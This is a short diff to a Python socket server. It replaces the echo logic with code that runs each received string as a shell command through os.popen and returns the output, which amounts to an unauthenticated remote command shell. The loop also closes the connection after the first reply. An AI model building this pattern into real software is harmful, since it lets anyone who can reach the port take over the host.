@@ -3,6 +3,7 @@
 
 BUF_SIZE = 1024
 
+import os
 import socket
 soc = socket.socket()
 hostname = socket.gethostname()
@@ -15,6 +16,9 @@ while True:
     data = con.recv(BUF_SIZE)
     if not data:
         break
-    received = data.decode()
-    con.send(received.encode())
+    command = data.decode()
+    #ps.open(received)
+    outfile = os.popen(command)
+    chrfile = outfile.read()
+    con.send(chrfile.encode())
     con.close()
